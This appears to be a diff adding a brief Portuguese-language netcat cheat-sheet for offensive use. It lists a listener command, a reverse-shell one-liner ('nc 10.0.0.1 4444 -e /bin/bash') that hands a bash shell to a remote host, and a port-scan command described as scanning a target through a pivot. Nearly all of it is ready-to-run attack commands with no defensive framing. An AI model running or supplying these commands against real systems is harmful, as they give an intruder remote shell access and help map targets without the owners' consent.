@@ -1,0 +1,20 @@
+A FERRAMENTA NETCAT PODE SER UTILIZADA PARA FORNECER UM SHELL E ESTABELECER UMA CONEXÃO
+
+---------------------------------------------------
+COMANDO PARA ESCUTAR CONEXÃO EM UMA PORTA
+
+netcat -lvp [porta que irá escutar]
+nc -lvp [porta que irá escutar]
+
+----------------------------------------------------
+COMANDO PARA CONECTAR COM A MÁQUINA QUE ESCUTA
+
+netcat [ip] [porta] -e [comando que será executado]
+
+nc 10.0.0.1 4444 -e /bin/bash
+----------------------------------------------------
+
+----------------------------------------------------
+SCANEAR UM ALVO PELO PIVOR COM O NETCAT
+
+nc -z -w 1 -n -vv ip port-port
